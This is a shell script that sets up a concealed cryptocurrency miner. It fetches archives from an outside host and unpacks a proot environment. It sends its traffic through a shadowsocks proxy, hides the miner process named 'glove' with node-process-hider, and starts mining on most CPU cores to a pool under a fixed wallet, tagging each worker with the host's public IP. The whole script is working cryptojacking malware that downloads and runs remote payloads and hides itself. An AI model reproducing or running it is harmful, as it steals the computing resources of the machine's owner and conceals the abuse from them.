#!/bin/sh
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
sleep 3
whoami
sleep 3
ls -la
sleep 3

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_ShinyJD_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 4`
echo ""
echo $used_num_of_cores
echo ""

sleep 2

Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &

sleep 2

curl -x socks5h://127.0.0.1:1082 ifconfig.me

sleep 2

wget http://greenleaf.teatspray.fun/update.tar.gz

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1082
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl api.ipify.org


npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add glove 1>/dev/null 2>&1

sleep 2

./update/update wget -q http://greenleaf.teatspray.fun/glove.tar.gz >/dev/null

tar -xf glove.tar.gz

sleep 2

apt update >/dev/null

sleep 2

apt -y install build-essential automake libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git >/dev/null

sleep 2

./update/update ./glove --algo yespower-b2b --param-n 2048 --param-r 32 --param-key "Now I am become Death, the destroyer of worlds" -o stratum+tcp://stratum-mining-pool.zapto.org:3765 -u MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate -p x -t $used_num_of_cores 1>/dev/null 2>&1
